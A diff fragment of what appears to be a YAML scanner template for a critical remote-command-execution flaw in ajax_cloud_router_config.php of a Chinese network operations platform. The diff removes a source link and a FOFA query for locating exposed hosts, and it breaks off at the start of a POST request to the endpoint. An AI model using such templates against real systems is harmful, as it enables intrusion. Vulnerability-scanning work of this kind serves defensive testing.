@@ -3,12 +3,8 @@ info:
   name: 全息AI网络运维平台ajax_cloud_router_config.php存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tstkf7gh50tgzpgs'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tstkf7gh50tgzpgs
-    fofa: '"全息AI网络运维平台"'
 http:
 - raw:
   - 'POST /nmss/cloud/Ajax/ajax_cloud_router_config.php HTTP/1.1
